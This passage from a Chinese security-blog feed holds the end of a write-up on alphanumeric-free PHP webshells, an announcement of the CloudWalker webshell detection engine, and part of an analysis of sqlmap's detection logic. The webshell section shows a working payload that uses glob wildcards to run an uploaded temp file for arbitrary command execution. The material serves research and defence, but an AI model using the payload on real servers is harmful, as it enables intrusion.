data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;82&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这是因为，能够匹配上&lt;code class=&quot;inline&quot;&gt;/???/?????????&lt;/code&gt;这个通配符的文件有很多，我们可以列出来：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6e44eec7c622f864030642b68cdcdc6b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;173&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6e44eec7c622f864030642b68cdcdc6b&quot; data-watermark-src=&quot;v2-0f688db4597b165c1c5dc34a530904e8&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;可见，我们要执行的&lt;code class=&quot;inline&quot;&gt;/tmp/phpcjggLC&lt;/code&gt;排在倒数第二位。然而，在执行第一个匹配上的文件（即&lt;code class=&quot;inline&quot;&gt;/bin/run-parts&lt;/code&gt;）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。&lt;/p&gt;&lt;p&gt;思路又陷入了僵局，虽然方向没错。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob&quot;&gt;深入理解glob通配符&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;大部分同学对于通配符，可能知道的都只有&lt;code class=&quot;inline&quot;&gt;*&lt;/code&gt;和&lt;code class=&quot;inline&quot;&gt;?&lt;/code&gt;。但实际上，阅读Linux的文档（ &lt;a href=&quot;http://man7.org/linux/man-pages/man7/glob.7.html&quot;&gt;http://man7.org/linux/man-pages/man7/glob.7.html&lt;/a&gt; ），可以学到更多有趣的知识点。&lt;/p&gt;&lt;p&gt;其中，glob支持用&lt;code class=&quot;inline&quot;&gt;[^x]&lt;/code&gt;的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉&lt;code class=&quot;inline&quot;&gt;/bin/run-parts&lt;/code&gt;：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b2d147c6c09b69aab2efb7d8046a300b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;97&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;排除了第4个字符是&lt;code class=&quot;inline&quot;&gt;-&lt;/code&gt;的文件，同样我们可以排除包含&lt;code class=&quot;inline&quot;&gt;.&lt;/code&gt;的文件：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c59a4961ad319c98364487b9d85e226e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;96&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。&lt;/p&gt;&lt;p&gt;继续阅读glob的帮助，我发现另一个有趣的用法：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-32fbe858e9a5ed8fd8a883dbed958d65_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;170&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-32fbe858e9a5ed8fd8a883dbed958d65&quot; data-watermark-src=&quot;v2-a6b07ffa5c6f67881ac73be1cd4ba977&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;就跟正则表达式类似，glob支持利用&lt;code class=&quot;inline&quot;&gt;[0-9]&lt;/code&gt;来表示一个范围。&lt;/p&gt;&lt;p&gt;我们再来看看之前列出可能干扰我们的文件：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6e44eec7c622f864030642b68cdcdc6b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;173&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6e44eec7c622f864030642b68cdcdc6b&quot; data-watermark-src=&quot;v2-0f688db4597b165c1c5dc34a530904e8&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。&lt;/p&gt;&lt;p&gt;翻开ascii码表，可见大写字母位于&lt;code class=&quot;inline&quot;&gt;@&lt;/code&gt;与&lt;code class=&quot;inline&quot;&gt;[&lt;/code&gt;之间：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-40258a449e935251e496f5801e46cce2_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;120&quot; data-rawheight=&quot;500&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;那么，我们可以利用&lt;code class=&quot;inline&quot;&gt;[@-[]&lt;/code&gt;来表示大写字母：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f5c44c17f36e843d322560e580dfa6e1_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;113&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f5c44c17f36e843d322560e580dfa6e1&quot; data-watermark-src=&quot;v2-7ea8ec12445ac8ccebb3f139c0614565&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;显然这一招是管用的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#poc&quot;&gt;构造POC，执行任意命令&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。&lt;/p&gt;&lt;p&gt;最后，我传入的code为&lt;code class=&quot;inline&quot;&gt;?&amp;gt;&amp;lt;?=`. /???/????????[@-[]`;?&amp;gt;&lt;/code&gt;，发送数据包如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f34dbd824e6fa5bb78c03114c7bf59f3_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;170&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f34dbd824e6fa5bb78c03114c7bf59f3&quot; data-watermark-src=&quot;v2-ab8e8a046bdfceb32e20b22164a2908c&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;成功执行任意命令。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-10-17-46806125</guid>
<pubDate>Wed, 17 Oct 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>牧云（CloudWalker）开源|如约而至: Webshell核心检测引擎</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-10-01-45796590.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/45796590&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-df5924b7082348a33d72d09a043bb848_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;相关背景阅读：&lt;/p&gt;&lt;p&gt;7月13日 &lt;a href=&quot;https://mp.weixin.qq.com/s/bGeE7WY-2P-SP9QiYeLTVw&quot;&gt;《牧云开源的背后》&lt;/a&gt;（点击进入）&lt;/p&gt;&lt;p&gt;9月14日 &lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;amp;mid=2651372030&amp;amp;idx=1&amp;amp;sn=682c49b3decda87ddf0ed641d5d347c6&amp;amp;chksm=8d39c876ba4e4160e88bacf0ffc3cadc39b60a269a6facec9f62134823af829624e42df52376&amp;amp;token=496332164&amp;amp;lang=zh_CN#rd&quot;&gt;牧云（CloudWalker）开源手记|Webshell监控检测策略初探&lt;/a&gt;（点击进入）&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0e4dd5f6883c711d9661a23b9fc6bfab_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1725&quot; data-rawheight=&quot;416&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0e4dd5f6883c711d9661a23b9fc6bfab&quot; data-watermark-src=&quot;v2-6556a6faf0ffdf7daa26510ae5ca1fa6&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;牧云（CloudWalker）服务器安全平台&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;核心检测引擎之Webshell检测&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;前言&lt;/h2&gt;&lt;p&gt;作为主机安全监控扫描的核心功能之一，Webshell 检测一直是令安全运维人员头疼的命题。传统的 Webshell 检测以规则扫描为主，动辄几百上千的服务器，如果要挨个手动排查 Webshell，几乎是不可能完成的任务。&lt;/p&gt;&lt;p&gt;颠覆以规则扫描为主的传统，牧云瞄准的是全自动、高度智能化的服务器安全平台。因此我们首先从 Webshell 检测引擎开始，以全新的理念重塑之。这正契合长亭一贯的“化繁为简、智能安全”的精益产品理念。&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;开源计划的第一步：开放命令行版本的 Webshell 检测引擎&lt;/b&gt;&lt;/blockquote&gt;&lt;p&gt;本次开源作为开源计划的第一步，仅包含 Webshell 检测引擎部分，重点调优 Webshell 检测效果。目前放出的是一个可执行的命令行版本 Webshell 检测工具。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;我们会根据用户反馈，不断优化检测效果。&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;后续三个月，将陆续开放整体产品框架与插件体系。&lt;/b&gt;&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;正文&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;Webshell 检测引擎之命令行版本&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;检测思路与代码结构&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;整个代码入口为一个依赖于 PHP-Ast 插件的 Detector，全部检测工作会在 Detector 内部进行。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-44e2f974c8955fe0246129ae469b6e3a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1729&quot; data-rawheight=&quot;295&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-44e2f974c8955fe0246129ae469b6e3a&quot; data-watermark-src=&quot;v2-9afd6bbb264de8c80e3da42b9930c024&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;Detector 结构内部会根据多个不同维度的指标进行评分。这些评分包括认定为恶意样本的正向评分，也包括认定为非恶意样本的负向评分，在保证召回率的同时，使得检测精确率得到稳定控制。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e642830a2230e256d86f26fc90471730_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1729&quot; data-rawheight=&quot;729&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e642830a2230e256d86f26fc90471730&quot; data-watermark-src=&quot;v2-ee81f6984768f4f079af38ffb8c4dead&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;为了减少降维对源数据特征向量的影响，使用多层次进行学习，并在 processor 的最顶层部分合并。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-268c12a297c03812bdbd1458f240099b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1729&quot; data-rawheight=&quot;355&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-268c12a297c03812bdbd1458f240099b&quot; data-watermark-src=&quot;v2-550419e06e6785b0e18c2cb37f61d6e6&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在每个测试用例中，对数据进行多次清洗，并尽可能少地对 Ast 进行遍历，兼顾处理速度和处理精度。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f35426cc7639eee84ac39b926e4468f1_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1729&quot; data-rawheight=&quot;427&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f35426cc7639eee84ac39b926e4468f1&quot; data-watermark-src=&quot;v2-cdfa88e1a0b404f92b29adce7e673b11&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f8ad16ac0435ac4e981a679a038ca69c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1729&quot; data-rawheight=&quot;338&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f8ad16ac0435ac4e981a679a038ca69c&quot; data-watermark-src=&quot;v2-f1b1ec729ad58a48336bf7fac0e7eeb3&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;整体代码的层次结构如下图所示：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ded94ee12fb2a6dd6ff59ea5154579d0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;902&quot; data-rawheight=&quot;813&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-ded94ee12fb2a6dd6ff59ea5154579d0&quot; data-watermark-src=&quot;v2-6bde47f5cbb5a3a8036f281809c7c796&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt; GitHub获取地址&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://github.com/chaitin/cloudwalker&quot;&gt;Http://github.com/chaitin/cloudwalker&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;检测界面和 HTML 报告&lt;/b&gt;&lt;/h2&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-36b3d8ca7f107c4f0f744296d84fcf72_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1729&quot; data-rawheight=&quot;973&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-36b3d8ca7f107c4f0f744296d84fcf72&quot; data-watermark-src=&quot;v2-d58aefaff2167af4f63f86746f03fb7b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;测试演示&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;命令行 gif 演示：&lt;a href=&quot;http://g.recordit.co/nVfELJPZIP.gif&quot;&gt;http://g.recordit.co/nVfELJPZIP.gif&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-44c292265d2da9286b81ed40f469794e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;913&quot; data-rawheight=&quot;947&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-44c292265d2da9286b81ed40f469794e&quot; data-watermark-src=&quot;v2-c58a3ac8e69322be7aa5451a2c54b04a&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;HTML 报告 gif 演示：&lt;a href=&quot;http://g.recordit.co/HCbHc9yq3o.gif&quot;&gt;http://g.recordit.co/HCbHc9yq3o.gif&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-da6d14b0dc132086e4a5f7fae14f70e4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1177&quot; data-rawheight=&quot;930&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-da6d14b0dc132086e4a5f7fae14f70e4&quot; data-watermark-src=&quot;v2-4e8d01abf52b63f0ddc3540340016520&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;使用环境要求&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;主流 Linux 发行版（内核不能太老，至少 2.6.32，否则会由于 Go 语言不支持直接打印 FATAL: kernel too old）&lt;/li&gt;&lt;li&gt;MacOS 可自行编译&lt;/li&gt;&lt;li&gt;Windows 暂不支持&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;可执行文件使用方法&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;用户可以直接运行可执行文件，参数可以是单个文件或目录（软链接）。对于目录会进行递归检测，但是不会跟进软链接。用户可用 `-output` 选项将检测结果导出到文件，推荐添加 `-html` 选项使用 HTML 文档格式进行导出。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2eef04b659cab8056346ff0a25cd0479_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1164&quot; data-rawheight=&quot;428&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-2eef04b659cab8056346ff0a25cd0479&quot; data-watermark-src=&quot;v2-e3abd74f1adbcfcf2a72138d1da00460&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;手动编译使用方法&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;用户可以在 `/php` 目录中执行 `make` 编译 PHP-Ast 解析插件，之后进入 `/bin` 目录使用 `go build` 编译程序主体，待编译完成后该目录下运行可执行文件。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;后记&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;牧云（CloudWalker）的方向是基于Agent的深度服务器工作负载安全平台，在云计算技术发展的大语境下，给混合云的复杂环境提供一个不同的、从内部进行观察的安全视角，提升资产能见度并有效防御入侵。根据项目计划会逐步覆盖服务器资产管理、威胁扫描、Webshell 查杀、基线检测等各项功能。&lt;/p&gt;&lt;p&gt;牧云（CloudWalker）开源计划也将秉持自由、共享的开源精神，持续营造社区。希望更多朋友参与进来，共同打造出具有更强大功能和更人性的管理思路的牧云（CloudWalker）。&lt;/p&gt;&lt;p&gt;长亭科技也是一个长期致力开源社区的网络安全企业，其他系列开源工具，了解一下：&lt;/p&gt;&lt;p&gt;https://github.com/chaitin/passionfruit 是iOS应用逆向与分析工具，可以大大加速iOS应用安全分析过程；&lt;/p&gt;&lt;p&gt;https://github.com/chaitin/yanshi 是长亭雷池（SafeLine）下一代Web应用防火墙核心引擎使用到的代码生成工具。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-10-01-45796590</guid>
<pubDate>Mon, 01 Oct 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>sqlmap 内核分析 III: 核心逻辑</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-09-25-45291193.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/45291193&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ab4b5d32ff7b3377b7dbe60c6c96676a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a href=&quot;https://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt;&lt;/p&gt;&lt;p&gt;安全研发工程师，现就职于长亭科技，喜欢喵喵&lt;/p&gt;&lt;p&gt;本文的内容可能是大家最期待的部分，但是可能并不推荐大家直接阅读本篇文章，因为太多原理性和整体逻辑上的东西散见前两篇文章，直接阅读本文可能会有一些难以预料的困难。：）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x00 前言&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;上一篇文章，我们介绍了页面相似度算法以及 sqlmap 对于页面相似的判定规则，同样也跟入了 sqlmap 的一些预处理核心函数。在接下来的部分中，我们会直接开始 sqlmap 的核心检测逻辑的分析，主要涉及到以下方面：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;heuristicCheckSqlInjection&lt;/code&gt; 启发式 SQL 注入检测（包括简单的 XSS FI 判断）&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;checkSqlInjection&lt;/code&gt; SQL 注入检测&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;0x01 heuristicCheckSqlInjection&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这个函数位于 &lt;code class=&quot;inline&quot;&gt;controller.py&lt;/code&gt; 的 &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; 函数中，同时我们在整体逻辑中也明确指明了这一个步骤：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-09948b0ca58809429e56dd2310d5ec2f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;611&quot; data-rawheight=&quot;446&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-09948b0ca58809429e56dd2310d5ec2f&quot; data-watermark-src=&quot;v2-f7f32b45d24eb8d0e6f2e09462767fd1&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这标红的两个步骤其实就是本篇文章主要需要分析的两个部分，涉及到 sqlmap 检测 sql 注入漏洞的核心逻辑。其中 &lt;code class=&quot;inline&quot;&gt;heuristicCheckSqlInjection&lt;/code&gt; 是我们本节需要分析的问题。这个函数的执行位置如下：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c98c16df1617579e51f1f913f6fb3133_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1230&quot; data-rawheight=&quot;665&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c98c16df1617579e51f1f913f6fb3133&quot; data-watermark-src=&quot;v2-1e909895c30fa2ec191a9ea45e811a07&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;再上图代码中，2标号为其位置。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;启发式 sql 注入检测整体逻辑&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;通过分析其源代码，笔者先行整理出他的逻辑：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7da991a0edce2a8f194655c662947172_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;1276&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7da991a0edce2a8f194655c662947172&quot; data-watermark-src=&quot;v2-ca8b016586a9ac0cb1dd4a3db315e29c&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;根据我们整理出的启发式检测流程图，我们做如下补充说明。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;进行启发式 sql 注入检测的前提条件是没有开启   &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 并且页面并不是 &lt;code class=&quot;inline&quot;&gt;heavilyDynamic&lt;/code&gt;。关于这两个属性，我们在第二篇文章中都有相关介绍，对于 &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 指的是一种不需要知道他的具体内容就可以知道整个内容大小的请求方法；&lt;code class=&quot;inline&quot;&gt;heavilyDynamic&lt;/code&gt; 指的是，在不改变任何参数的情况下，请求两次页面，两次页面的相似度低于 0.98。&lt;/li&gt;&lt;li&gt;在实际的代码中，决定注入的结果报告的，主要在于两个标识位，分别为：&lt;code class=&quot;inline&quot;&gt;casting&lt;/code&gt; 与 &lt;code class=&quot;inline&quot;&gt;result&lt;/code&gt;。笔者在下方做代码批注和说明：&lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-65ac833460ef8e12ff6daaabc9877f78_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2280&quot; data-rawheight=&quot;716&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-65ac833460ef8e12ff6daaabc9877f78&quot; data-watermark-src=&quot;v2-e4cb4750c314ba6f8aae4f8641ca9f82&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;3.&lt;code class=&quot;inline&quot;&gt; casting&lt;/code&gt; 这个标识位主要取决于两种情况：第一种在第一个请求就发现存在了特定的类型检查的迹象；第二种是在请求小数情况的时候，发现小数被强行转换为整数。通常对于这种问题，在不考虑 tamper 的情况下，一般很难检测出或者绕过。&lt;/p&gt;&lt;p&gt;4. &lt;code class=&quot;inline&quot;&gt;result&lt;/code&gt; 这个标识位取决于：如果检测出 DBMS 错误，则会设置这个标识位为 True；如果出现了数据库执行数值运算，也置为 True。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;XSS 与 FI&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;实际上在启发式 sql 注入检测完毕之后，会执行其他的检测：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e8d011c2b1307283c0d6b53e47775df8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1644&quot; data-rawheight=&quot;870&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e8d011c2b1307283c0d6b53e47775df8&quot; data-watermark-src=&quot;v2-53ef9a98611b8aa91bb8e7ff7ee54e1f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;ol&gt;&lt;li&gt;检测 XSS 的方法其实就是检查 &lt;code class=&quot;inline&quot;&gt;&quot;&amp;lt;&#39;\&quot;&amp;gt;&quot;&lt;/code&gt;，是否出现在了结果中。作为扩展，我们可以在此检查是否随机字符串还在页面中，从而判断是否存在 XSS 的迹象。&lt;/li&gt;&lt;li&gt;检测 FI（文件包含），就是检测结果中是否包含了 &lt;code class=&quot;inline&quot;&gt;include/require&lt;/code&gt; 等报错信息，这些信息是通过特定正则表达式来匹配检测的。&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;0x02 checkSqlInjection&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这个函数可以说是 sqlmap 中最核心的函数了。在这个函数中，处理了 Payload 的各种细节和测试用例的各种细节。&lt;/p&gt;&lt;p&gt;大致执行步骤分为如下几个大部分：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;根据已知参数类型筛选 boundary&lt;/li&gt;&lt;li&gt;启发式检测数据库类型 &lt;code class=&quot;inline&quot;&gt;heuristicCheckDbms&lt;/code&gt;&lt;/li&gt;&lt;li&gt;payload 预处理（UNION）&lt;/li&gt;&lt;li&gt;过滤与排除不合适的测试用例&lt;/li&gt;&lt;li&gt;对筛选出的边界进行遍历与 payload 整合&lt;/li&gt;&lt;li&gt;payload 渲染&lt;/li&gt;&lt;li&gt;针对四种类型的注入分别进行 response 的响应和处理&lt;/li&gt;&lt;li&gt;得出结果，返回结果&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;下图是笔者折叠无关代码之后剩余的最核心的循环和条件分支，我们发现他关于 &lt;code class=&quot;inline&quot;&gt;injectable&lt;/code&gt; 的设置完全是通过 &lt;code class=&quot;inline&quot;&gt;if method == PAYLOAD.METHOD.[COMPARISON/GREP/TIME/UNION]&lt;/code&gt; 这几个条件分支去处理的，同时这些条件显然是 sqlmap 针对不同的注入类型的 Payload 进行自己的结果处理逻辑饿和判断逻辑。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-1ff54b5a86ad202b1b2b0d770c262eb7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1774&quot; data-rawheight=&quot;1312&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-1ff54b5a86ad202b1b2b0d770c262eb7&quot; data-watermark-src=&quot;v2-8fb80e21a653bfa7afbdc16fa7221498&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;数据库类型检测 heuristicCheckDbms&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们在本大节刚开始的时候，就已经说明了第二步是确定数据库的类型，那么数据库类型来源于用户设定或者自动检测，当截止第二步之前还没有办法确定数据库类型的时候，就会自动启动 &lt;code class=&quot;inline&quot;&gt;heuristicCheckDbms&lt;/code&gt; 这个函数，利用一些简单的测试来确定数据库类型。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b1c6a11d5b3a8a023cf5a4444675e1d9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1229&quot; data-rawheight=&quot;652&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b1c6a11d5b3a8a023cf5a4444675e1d9&quot; data-watermark-src=&quot;v2-5c4556182c1195c912df953e4c08951f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其实这个步骤非常简单，核心原理是利用简单的布尔盲注构造一个 &lt;code class=&quot;inline&quot;&gt;(SELECT &quot;[RANDSTR]&quot; 